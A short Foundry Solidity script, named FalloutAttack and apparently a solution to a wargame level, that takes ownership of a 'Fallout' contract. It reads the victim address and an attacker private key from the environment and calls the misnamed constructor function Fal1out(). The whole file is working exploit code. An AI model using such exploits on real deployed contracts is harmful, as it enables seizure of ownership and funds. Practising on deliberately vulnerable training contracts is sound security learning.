// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutAttack is Script{
  function run() public{
    address falloutAddress = vm.envAddress("VICTIM_CONTRACT_INSTANCE");
    Fallout fallout = Fallout(falloutAddress);

    uint256 attacker = vm.envUint("PRIVATE_KEY");

    vm.startBroadcast(attacker);

    // Attack
    fallout.Fal1out();

    vm.stopBroadcast();
  }
}